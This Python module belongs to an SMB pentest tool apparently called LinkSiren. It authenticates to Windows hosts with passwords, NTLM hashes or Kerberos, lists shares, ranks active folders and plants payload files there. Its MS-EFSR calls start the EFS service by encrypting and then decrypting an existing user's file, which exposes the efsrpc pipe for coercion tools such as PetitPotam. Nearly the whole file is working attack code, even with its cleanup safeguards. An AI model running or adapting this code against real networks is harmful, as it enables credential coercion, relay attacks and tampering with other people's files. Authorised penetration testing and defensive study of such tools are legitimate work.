"""
Author: George Hamilton
HostTarget — one SMB target with helpers to enumerate shares, write/delete
payloads, and recursively rank folders.
"""

import logging
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import WSTR, ULONG
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.srvs import STYPE_DISKTREE, STYPE_MASK
from impacket import uuid
import linksiren.pure_functions


# MS-EFSR EFSRPC interface. UUID + version per [MS-EFSR] 1.9.
# The dedicated \PIPE\efsrpc endpoint is preferred; \lsarpc also exposes the
# interface on modern Windows but with stricter ACLs.
_EFSR_UUID = uuid.uuidtup_to_bin(("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"))


class _EfsRpcEncryptFileSrv(NDRCALL):
    """[MS-EFSR] 3.1.4.2.4 — opnum 4."""

    opnum = 4
    structure = (("FileName", WSTR),)


class _EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class _EfsRpcDecryptFileSrv(NDRCALL):
    """[MS-EFSR] 3.1.4.2.5 — opnum 5."""

    opnum = 5
    structure = (("FileName", WSTR), ("OpenFlag", ULONG))


class _EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


# Module-level OPNUMS lookup table used by impacket's request dispatcher to
# match each request class to its response parser.
OPNUMS = {
    4: (_EfsRpcEncryptFileSrv, _EfsRpcEncryptFileSrvResponse),
    5: (_EfsRpcDecryptFileSrv, _EfsRpcDecryptFileSrvResponse),
}


def _efsr_call(smb_connection, request, logger=None):
    """Bind to the EFSR interface and send ``request``; return the response.

    Tries each documented EFSR-bearing named pipe in order of dedicated-ness.
    Raises on the last failure if no pipe accepts the call.
    """
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY

    last_error = None
    for pipe in (r"\efsrpc", r"\lsarpc", r"\samr", r"\netlogon"):
        rpctransport = transport.SMBTransport(
            smb_connection.getRemoteHost(),
            smb_connection.getRemoteHost(),
            filename=pipe,
            smb_connection=smb_connection,
        )
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
            # Privacy is required by the EFSR interface — without it the
            # bind succeeds but every call returns rpc_s_access_denied.
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(_EFSR_UUID)
            resp = dce.request(request)
            if logger:
                logger.debug(
                    "EFSR opnum=%d via %s returned %s",
                    request.opnum,
                    pipe,
                    getattr(resp, "ErrorCode", "?"),
                )
            return resp
        except Exception as e:
            last_error = e
            if logger:
                logger.debug("EFSR pipe %s failed: %s", pipe, e)
            continue
        finally:
            try:
                dce.disconnect()
            except Exception:
                pass
    if last_error is not None:
        raise last_error


def _efsr_encrypt_remote(smb_connection, unc_path: str, logger=None) -> None:
    """Call EfsRpcEncryptFileSrv on the server hosting ``smb_connection``."""
    req = _EfsRpcEncryptFileSrv()
    req["FileName"] = unc_path + "\x00"
    _efsr_call(smb_connection, req, logger=logger)


def _efsr_decrypt_remote(smb_connection, unc_path: str, logger=None) -> None:
    """Call EfsRpcDecryptFileSrv to undo EFS encryption in place.

    Used by the default `--encrypt` mode immediately after a payload is
    written with `FILE_ATTRIBUTE_ENCRYPTED` — the encrypted-on-create write
    triggers the EFS service via the SCM trigger; the follow-up decrypt
    restores plaintext content while leaving the EFS service Running, so
    `\\PIPE\\efsrpc` stays available for downstream coercion tools but the
    payload itself doesn't carry an encryption attribute.
    """
    req = _EfsRpcDecryptFileSrv()
    req["FileName"] = unc_path + "\x00"
    req["OpenFlag"] = 0
    _efsr_call(smb_connection, req, logger=logger)


class HostTarget:
    """A single SMB host and the share-or-folder paths to operate on."""

    def __init__(
        self,
        host: str,
        paths: list[str] = None,
        connection: SMBConnection = None,
        logged_in: bool = False,
    ):
        if paths is None:
            paths = []

        self.host = host
        self.paths = paths
        self.connection = connection
        self.logged_in = logged_in

        if self.connection is not None and self.host is None:
            self.host = self.connection.getRemoteHost()

    # ------------------------------------------------------------------ #
    # Pure helpers                                                       #
    # ------------------------------------------------------------------ #
    def add_path(self, path: str):
        """Append ``path`` to ``self.paths`` if not already present."""
        if path not in self.paths:
            self.paths.append(path)

    # ------------------------------------------------------------------ #
    # Connection                                                         #
    # ------------------------------------------------------------------ #
    def connect(self, credentials, ntlmFallback: bool = True):
        """Connect to the SMB server and authenticate.

        The authentication path is chosen from ``credentials``:

        * ``credentials.use_kerberos`` → ``SMBConnection.kerberosLogin`` (a
          ccache referenced by ``$KRB5CCNAME`` is honored automatically by
          Impacket when no TGT/TGS is supplied).
        * otherwise → ``SMBConnection.login`` with password and/or NTLM hash.
        """
        logger = logging.getLogger("main_logger")

        if self.connection is not None:
            # Already connected — login was either done elsewhere or via the
            # connection that was passed in at construction.
            return

        # Kerberos SPN lookup needs an FQDN. If self.host is an IP literal
        # and Kerberos is in use, reverse-DNS it for the SPN; keep the IP
        # as the network endpoint via remoteHost.
        remote_name = self.host
        if getattr(credentials, "use_kerberos", False):
            import ipaddress, socket
            try:
                ipaddress.ip_address(self.host)
                try:
                    primary, aliases, _ = socket.gethostbyaddr(self.host)
                    candidates = [n for n in [primary] + list(aliases) if "." in n]
                    if candidates:
                        remote_name = candidates[0]
                        logger.info(
                            "-k against IP target; resolved %s -> %s for the "
                            "cifs SPN.",
                            self.host, remote_name,
                            extra={"path": f"\\\\{self.host}"},
                        )
                except (socket.herror, socket.gaierror) as e:
                    logger.warning(
                        "-k against IP target; reverse DNS failed (%s).", e,
                        extra={"path": f"\\\\{self.host}"},
                    )
            except ValueError:
                pass

        try:
            self.connection = SMBConnection(remoteName=remote_name, remoteHost=self.host)
        except SessionError as e:
            logger.error(
                "Failed to connect to host.",
                extra={"path": f"\\\\{self.host}", "exception": str(e)},
            )
            self.connection = None
            return

        try:
            if getattr(credentials, "anonymous", False):
                # NULL session: empty user, empty password, empty domain. Most
                # modern hosts deny this, but it's the right probe for the
                # "test for anonymous access to shares" recon path.
                self.connection.login("", "", "", "", "", ntlmFallback)
            elif getattr(credentials, "use_kerberos", False):
                self.connection.kerberosLogin(
                    user=credentials.username,
                    password=credentials.password,
                    domain=credentials.domain,
                    lmhash=getattr(credentials, "lmhash", ""),
                    nthash=getattr(credentials, "nthash", ""),
                    aesKey=getattr(credentials, "aes_key", ""),
                    kdcHost=getattr(credentials, "kdc_host", None),
                    useCache=True,
                )
            else:
                self.connection.login(
                    credentials.username,
                    credentials.password,
                    credentials.domain,
                    getattr(credentials, "lmhash", ""),
                    getattr(credentials, "nthash", ""),
                    ntlmFallback,
                )
            self.logged_in = True
        except SessionError as e:
            self.connection = None
            logger.error(
                "Failed to connect to host.",
                extra={"path": f"\\\\{self.host}", "exception": str(e)},
            )
        except Exception as e:
            # kerberosLogin raises a wider set of errors than SessionError
            # (KerberosError, gssapi exceptions, ccache parse errors, …). Catch
            # them so a single misconfigured target doesn't kill the whole run.
            self.connection = None
            logger.error(
                "Failed to authenticate to host.",
                extra={"path": f"\\\\{self.host}", "exception": str(e)},
            )

    # ------------------------------------------------------------------ #
    # Share / path enumeration                                           #
    # ------------------------------------------------------------------ #
    def expand_paths(self):
        """Replace empty ``""`` entries in ``self.paths`` with the host's shares."""
        if "" in self.paths:
            self.populate_shares()
            # Remove every empty entry in case the user supplied more than one.
            self.paths[:] = [p for p in self.paths if p != ""]

    def populate_shares(self):
        """Append every disk-tree share on the host to ``self.paths``."""
        logger = logging.getLogger("main_logger")

        if self.connection is None:
            logger.error("Not connected to host.", extra={"path": f"\\\\{self.host}"})
            return

        try:
            resp = self.connection.listShares()
        except SessionError as e:
            logger.error(
                "Failed to connect to get shares for host.",
                extra={"path": f"\\\\{self.host}", "exception": str(e)},
            )
            return

        for share_info in resp:
            share_name = share_info["shi1_netname"][:-1]
            share_type = share_info["shi1_type"]
            # Filter to file-system shares (skip IPC$, named pipes, etc.).
            if share_type & STYPE_MASK == STYPE_DISKTREE:
                self.add_path(share_name)

    # ------------------------------------------------------------------ #
    # Payload write / delete                                             #
    # ------------------------------------------------------------------ #
    def _wake_efs_via_throwaway(self, share: str, folder: str) -> None:
        """Briefly write+delete a hidden file with FILE_ATTRIBUTE_ENCRYPTED.

        NTFS sees the encryption bit at CreateFile time and asks EFS to
        encrypt; this is the SCM trigger that starts a stopped EFS service.
        Used by `--encrypt-target=existing` so we can EFSR-encrypt an
        EXISTING file (which requires EFS already running) without leaving
        a permanent payload-style trigger file behind.
        """
        import secrets

        logger = logging.getLogger("main_logger")
        trigger_name = f".linksiren_efs_wake_{secrets.token_hex(8)}"
        trigger_path = trigger_name if folder == "" else f"{folder}\\{trigger_name}"
        try:
            tree = self.connection.connectTree(share=share)
        except Exception as e:
            logger.warning(
                "EFS wake: could not connect to share.",
                extra={"path": f"\\\\{self.host}\\{share}", "exception": str(e)},
            )
            return
        try:
            try:
                fh = self.connection.createFile(
                    tree, trigger_path, fileAttributes=0x4000
                )
                self.connection.closeFile(tree, fh)
                logger.info(
                    "EFS wake: wrote throwaway trigger file with "
                    "FILE_ATTRIBUTE_ENCRYPTED.",
                    extra={"path": f"\\\\{self.host}\\{share}\\{trigger_path}"},
                )
            except Exception as e:
                logger.warning(
                    "EFS wake: could not create throwaway trigger file.",
                    extra={
                        "path": f"\\\\{self.host}\\{share}\\{trigger_path}",
                        "exception": str(e),
                    },
                )
                return
            try:
                self.connection.deleteFile(shareName=share, pathName=trigger_path)
            except Exception as e:
                logger.warning(
                    "EFS wake: could not delete throwaway trigger file.",
                    extra={
                        "path": f"\\\\{self.host}\\{share}\\{trigger_path}",
                        "exception": str(e),
                    },
                )
        finally:
            try:
                self.connection.disconnectTree(tree)
            except Exception:
                pass

    def _find_smallest_existing_file(
        self, share: str, folder: str
    ) -> str | None:
        """Return relative path of the smallest non-empty file in ``share\\folder``.

        Skips directories, the ``.`` / ``..`` entries, and zero-byte files
        (zero-byte files don't tell us much about whether the user trusts
        the path; we want a real file). Returns ``None`` if nothing fits.
        """
        try:
            pattern = "*" if folder == "" else f"{folder}\\*"
            entries = self.connection.listPath(shareName=share, path=pattern)
        except Exception:
            return None
        candidates = []
        for entry in entries:
            if entry.is_directory():
                continue
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            size = entry.get_filesize()
            if size > 0:
                candidates.append((size, name))
        if not candidates:
            return None
        candidates.sort()
        smallest = candidates[0][1]
        return smallest if folder == "" else f"{folder}\\{smallest}"

    def _probe_writable_and_deletable(self, share: str, folder: str) -> bool:
        """Return True if we can both create and delete a small file at ``folder``.

        Writes a uniquely-named zero-byte probe and immediately deletes it.
        Used to avoid the failure mode where deploy can create a payload but
        cleanup can't remove it — that leaves an orphan on the share, which
        is exactly the artifact a coordinated-disclosure-grade engagement
        is trying not to leave behind.

        Any SMB error during either step → False (and the calling code logs
        a WARNING and skips the real write). On success the probe is gone.
        """
        import secrets

        logger = logging.getLogger("main_logger")
        probe_name = f".linksiren_probe_{secrets.token_hex(8)}"
        probe_path = probe_name if folder == "" else f"{folder}\\{probe_name}"
        probe_unc = f"\\\\{self.host}\\{share}\\{probe_path}"

        # Use a fresh tree so a probe failure doesn't poison the caller's tree.
        try:
            probe_tree = self.connection.connectTree(share=share)
        except Exception as e:
            logger.warning(
                "Probe failed: could not open tree for delete check.",
                extra={"path": probe_unc, "exception": str(e)},
            )
            return False
        try:
            try:
                fh = self.connection.createFile(probe_tree, probe_path)
            except Exception as e:
                logger.warning(
                    "Probe failed: could not write probe file. Skipping real "
                    "payload write to avoid leaving an undeletable artifact.",
                    extra={"path": probe_unc, "exception": str(e)},
                )
                return False
            try:
                self.connection.closeFile(probe_tree, fh)
            except Exception:
                pass
            try:
                self.connection.deleteFile(shareName=share, pathName=probe_path)
            except Exception as e:
                logger.warning(
                    "Probe failed: write succeeded but delete did not. "
                    "Skipping real payload write to avoid leaving an "
                    "undeletable artifact. The probe file may still exist.",
                    extra={"path": probe_unc, "exception": str(e)},
                )
                return False
        finally:
            try:
                self.connection.disconnectTree(probe_tree)
            except Exception:
                pass
        return True

    def write_payload(
        self,
        path: str,
        payload_name: str,
        payload: bytes,
        force: bool = False,
        encrypt: bool = False,
        encrypt_keep: bool = False,
        encrypt_target: str = "payload",
        probe_delete: bool = False,
    ):
        """Write ``payload`` to ``\\\\host\\path\\payload_name``.

        If a file at the destination already exists and ``force`` is False
        (the default), the write is skipped and ``None`` is returned with a
        WARNING logged — the safe default in a pentest is to never silently
        overwrite real user data with a payload that happens to share its
        name. Pass ``force=True`` to overwrite.

        When ``probe_delete`` is True, writes a small uniquely-named probe
        file first, deletes it, and only proceeds with the real payload if
        both steps succeed. Avoids the failure mode where deploy can write
        but cleanup can't remove.

        When ``encrypt`` is True, wakes the triggered-start EFS service on
        the target and exposes ``\\PIPE\\efsrpc`` for follow-on coercion
        tools (Coercer, PetitPotam). Two ``encrypt_target`` modes:

        * ``"payload"`` (default): passes ``FILE_ATTRIBUTE_ENCRYPTED``
          (0x4000) in the SMB CREATE request for the payload — NTFS asks
          EFS to encrypt the new file, triggering the service via the SCM
          trigger. The file is then immediately decrypted via
          ``EfsRpcDecryptFileSrv`` so the payload lands on disk with normal
          attributes; pass ``encrypt_keep=True`` to leave it EFS-encrypted.
        * ``"existing"``: writes the payload as plaintext, then picks the
          smallest non-empty existing file in the target folder, briefly
          wakes EFS by write+delete of a hidden throwaway file, and
          encrypts+decrypts the chosen existing file via EFSR. Net effect:
          our payload is untouched by encryption; an existing file has its
          mtime/atime nudged; EFS service is up and ``\\PIPE\\efsrpc`` is
          exposed.

        NTFS-only; requires the calling user to have an EFS certificate
        available on the server.

        Returns the full UNC path on success, or ``None`` on any failure
        before the bytes were committed (or when skipping an existing file).
        A failure to close the file or disconnect the tree after the write
        is logged but still treated as success — the bytes are on disk.
        """
        share = path.split("\\")[0]
        folder = "\\".join(path.split("\\")[1:])
        if folder == "":  # If the folder is the root of the share
            payload_path = payload_name
        else:
            payload_path = f"{folder}\\{payload_name}"

        full_path = f"\\\\{self.host}\\{share}\\{payload_path}"
        logger = logging.getLogger("main_logger")

        if self.connection is None:
            logger.error(
                "Failed to write payload. Not connected to host",
                extra={"path": f"\\\\{self.host}"},
            )
            return None

        try:
            tree_id = self.connection.connectTree(share=share)
        except Exception as e:
            logger.error(
                "Failed to write payload. Could not connect to share.",
                extra={"path": f"\\\\{self.host}\\{share}", "exception": str(e)},
            )
            return None

        # Safety: probe write+delete before committing real bytes.
        if probe_delete and not self._probe_writable_and_deletable(share, folder):
            return None

        # Safety: refuse to clobber existing files unless force=True. We probe
        # via listPath on the exact filename pattern; if the share doesn't
        # let us list at all we silently fall through to the create attempt.
        if not force:
            try:
                existing = self.connection.listPath(shareName=share, path=payload_path)
                # listPath returns ``.`` / ``..`` even for an empty match — so
                # we only treat it as "exists" if the matching entry's longname
                # is the actual file we're about to write.
                if any(e.get_longname() == payload_name for e in (existing or [])):
                    logger.warning(
                        "Refusing to overwrite existing file. Use force=True to override.",
                        extra={"path": full_path},
                    )
                    return None
            except Exception:
                # Not-found / access-denied / no-listing-rights — fall through
                # to the createFile attempt and let it speak.
                pass

        # FILE_ATTRIBUTE_ENCRYPTED = 0x4000. When the SMB CreateFile
        # request carries this bit and the share is on NTFS, the server
        # asks EFS to encrypt the new file — and the SCM service-trigger
        # for "EFS named-pipe access" wakes a stopped EFS service before
        # the create completes. That's the whole point of --encrypt:
        # transition EFS from triggered-start-stopped to running on the
        # target, exposing \PIPE\efsrpc for follow-on coercion tools like
        # Coercer / PetitPotam. FILE_ATTRIBUTE_NORMAL = 0x80 is the
        # impacket default.
        # encrypt_target=payload requests FILE_ATTRIBUTE_ENCRYPTED on the
        # payload itself. encrypt_target=existing writes the payload plain
        # and uses an existing file for the trigger (handled after the write).
        use_payload_for_trigger = encrypt and encrypt_target == "payload"
        create_attrs = 0x4000 if use_payload_for_trigger else 0x80
        if use_payload_for_trigger:
            logger.info(
                "Requested FILE_ATTRIBUTE_ENCRYPTED on create — this is the "
                "EFS triggered-start signal.",
                extra={"path": full_path},
            )
        try:
            file_handle = self.connection.createFile(
                tree_id, payload_path, fileAttributes=create_attrs
            )
            logger.info("Opened file for writing.", extra={"path": full_path})
        except Exception as e:
            logger.error(
                "Failed to write payload. Could not create file.",
                extra={"path": full_path, "exception": str(e)},
            )
            return None

        try:
            self.connection.writeFile(treeId=tree_id, fileId=file_handle, data=payload)
            logger.info("Successfully wrote payload file.", extra={"path": full_path})
        except Exception as e:
            logger.error(
                "Failed to write payload. Could not write to open file.",
                extra={"path": full_path, "exception": str(e)},
            )
            return None

        # Close the SMB file handle BEFORE the EFSR call. The EFSR encrypt
        # operation opens the file server-side and would conflict with our
        # still-open SMB handle (Windows uses share-mode locking).
        try:
            self.connection.closeFile(treeId=tree_id, fileId=file_handle)
        except Exception as e:
            logger.error(
                "Failed to write payload. Could not close file after writing.",
                extra={"path": full_path, "exception": str(e)},
            )
            return None

        try:
            self.connection.disconnectTree(tree_id)
        except Exception as e:
            logger.error(
                "Payload written. Failed to cleanly disconnect from share.",
                extra={"path": full_path, "exception": str(e)},
            )
            # Don't early-return — we may still want to attempt EFSR encryption.

        if encrypt and encrypt_target == "existing":
            # Pick the smallest non-empty existing file in the target folder
            # and use set+revert against it. Requires EFS running, so wake it
            # via a throwaway trigger file first.
            smallest_rel = self._find_smallest_existing_file(share, folder)
            if smallest_rel is None:
                logger.warning(
                    "encrypt_target=existing: no non-empty existing file "
                    "found in target folder to use for EFS trigger.",
                    extra={"path": f"\\\\{self.host}\\{share}\\{folder}"},
                )
            else:
                smallest_unc = f"\\\\{self.host}\\{share}\\{smallest_rel}"
                logger.info(
                    "encrypt_target=existing: chose smallest file for EFS "
                    "trigger.",
                    extra={"path": smallest_unc},
                )
                # Wake EFS if needed (throwaway write+delete with ENCRYPTED bit)
                self._wake_efs_via_throwaway(share, folder)
                try:
                    _efsr_encrypt_remote(
                        self.connection, smallest_unc, logger=logger
                    )
                    logger.info(
                        "Encrypted existing file via EfsRpcEncryptFileSrv.",
                        extra={"path": smallest_unc},
                    )
                    if not encrypt_keep:
                        try:
                            _efsr_decrypt_remote(
                                self.connection, smallest_unc, logger=logger
                            )
                            logger.info(
                                "Reverted EFS encryption on existing file via "
                                "EfsRpcDecryptFileSrv (file restored to "
                                "plaintext; EFS service remains running).",
                                extra={"path": smallest_unc},
                            )
                        except Exception as e:
                            logger.warning(
                                "Existing file encrypted but DecryptFileSrv "
                                "revert failed. Existing file remains "
                                "EFS-encrypted on disk — pentester should "
                                "manually decrypt or restore.",
                                extra={
                                    "path": smallest_unc,
                                    "exception": str(e),
                                },
                            )
                except Exception as e:
                    logger.warning(
                        "encrypt_target=existing: EfsRpcEncryptFileSrv on "
                        "the chosen existing file failed; EFS service may "
                        "or may not have been triggered.",
                        extra={
                            "path": smallest_unc,
                            "exception": str(e),
                        },
                    )
        elif encrypt and not encrypt_keep:
            # Default: revert the payload's encryption attribute via EFSR so
            # the file lands on disk with no encryption artifact. Verified
            # in the lab: 1) the SMB CREATE with FILE_ATTRIBUTE_ENCRYPTED
            # already triggered EFS startup and exposed \PIPE\efsrpc;
            # 2) the DecryptFileSrv call preserves payload content
            # byte-for-byte (encrypt+decrypt is round-trip when both sides
            # happen via the same logged-in user with the EFS cert).
            try:
                _efsr_decrypt_remote(self.connection, full_path, logger=logger)
                logger.info(
                    "Reverted EFS encryption via EfsRpcDecryptFileSrv "
                    "(payload now plaintext on disk; EFS service remains "
                    "running and \\PIPE\\efsrpc remains exposed for "
                    "follow-on coercion).",
                    extra={"path": full_path},
                )
            except Exception as e:
                # Non-fatal: the encryption attribute is still on the file
                # but the trigger already fired, so EFS is up. The cleanup
                # mode still works; the file is just visibly encrypted.
                logger.warning(
                    "EFS trigger fired but DecryptFileSrv revert failed. "
                    "File remains EFS-encrypted on disk. EFS service is "
                    "still running on the target.",
                    extra={"path": full_path, "exception": str(e)},
                )
        elif encrypt and encrypt_keep:
            # Pentester explicitly asked for persistent encryption. Try the
            # RPC to ensure the bit is fully committed; failure is OK because
            # the createFile attr already set it.
            try:
                _efsr_encrypt_remote(self.connection, full_path, logger=logger)
                logger.info(
                    "Marked payload encrypted via EfsRpcEncryptFileSrv (kept).",
                    extra={"path": full_path},
                )
            except Exception as e:
                logger.warning(
                    "Payload written with FILE_ATTRIBUTE_ENCRYPTED but "
                    "EfsRpcEncryptFileSrv follow-up failed. The createFile "
                    "attribute alone should have triggered EFS server-side.",
                    extra={"path": full_path, "exception": str(e)},
                )

        return full_path

    def delete_payloads(self):
        """Delete every payload at ``self.paths``; return paths that failed."""
        payloads_not_deleted = []
        for path in self.paths:
            if self.delete_payload(path) is False:
                payloads_not_deleted.append(f"\\\\{self.host}\\{path}")
        return payloads_not_deleted

    def delete_payload(self, path: str):
        """Delete a single payload at ``share\\folder\\…\\file.ext``."""
        share = path.split("\\")[0]
        payload_path = "\\".join(path.split("\\")[1:])
        logger = logging.getLogger("main_logger")

        unc_path = f"\\\\{self.host}\\{share}\\{payload_path}"

        if self.connection is None:
            logger.critical(
                "Failed to delete payload. Not connected to host.",
                extra={"path": unc_path},
            )
            return False

        try:
            self.connection.deleteFile(shareName=share, pathName=payload_path)
            logger.info("Successfully deleted payload.", extra={"path": unc_path})
            return True
        except Exception as e:
            logger.critical(
                "Failed to delete payload",
                extra={"path": unc_path, "exception": str(e)},
            )
            return False

    # ------------------------------------------------------------------ #
    # Folder review                                                      #
    # ------------------------------------------------------------------ #
    def review_all_folders(
        self, folder_rankings, active_threshold_date, depth, fast, ignore_folders=None
    ):
        """Walk every path in ``self.paths`` and update ``folder_rankings``."""
        logger = logging.getLogger("main_logger")
        if ignore_folders is None:
            ignore_folders = []

        if self.connection is None:
            logger.error(
                "Failed to review folders. Not connected to host.",
                extra={"path": f"\\\\{self.host}"},
            )
            return folder_rankings

        for folder in self.paths:
            unc_path = f"\\\\{self.host}\\{folder}"
            logger.debug("Started reviewing path", extra={"path": unc_path})
            if folder in ignore_folders:
                logger.debug(
                    "Skipping review of share or folder based on the --ignore-shares argument.",
                    extra={"path": unc_path},
                )
                continue
            folder_rankings = {
                **folder_rankings,
                **self.review_folder(
                    folder_rankings, folder, active_threshold_date, depth, fast
                ),
            }
        return folder_rankings

    def review_folder(self, folder_rankings, path, active_threshold_date, depth, fast):
        """Recursively rank ``path`` by the count of active files it holds."""
        logger = logging.getLogger("main_logger")
        ranking = 0
        subfolders = []
        reviewed = False
        depth_reached = depth <= 1

        share = path.split("\\")[0]
        folder = "\\".join(path.split("\\")[1:])
        unc_path = f"\\\\{self.host}\\{path}"

        try:
            listings = self.connection.listPath(shareName=share, path=f"{folder}\\*")
        except SessionError as e:
            logger.error("Failed to list paths", extra={"path": unc_path, "exception": str(e)})
            return folder_rankings

        for listing in listings:
            reviewed = fast and ranking > 0  # Done reviewing if in fast mode + ranking nonzero
            is_file = not listing.is_directory()
            name = listing.get_longname()

            # If folder is active and max_depth is reached
            if reviewed and depth_reached:
                break

            elif (
                not reviewed
                and is_file
                and linksiren.pure_functions.is_active_file(
                    access_time=listing.get_atime_epoch(),
                    threshold_date=active_threshold_date,
                )
            ):
                ranking += 1

            elif not (is_file or depth_reached or name == "." or name == ".."):
                if folder == "":
                    subfolder_path = f"{share}\\{name}"
                else:
                    subfolder_path = f"{share}\\{folder}\\{name}"
                subfolders.append(f"{subfolder_path}")

        if not depth_reached:
            for subfolder in subfolders:
                # Requires python 3.9 or greater
                folder_rankings = folder_rankings | self.review_folder(
                    folder_rankings, subfolder, active_threshold_date, depth - 1, fast
                )

        folder_rankings[f"\\\\{self.host}\\{path}"] = ranking
        return folder_rankings
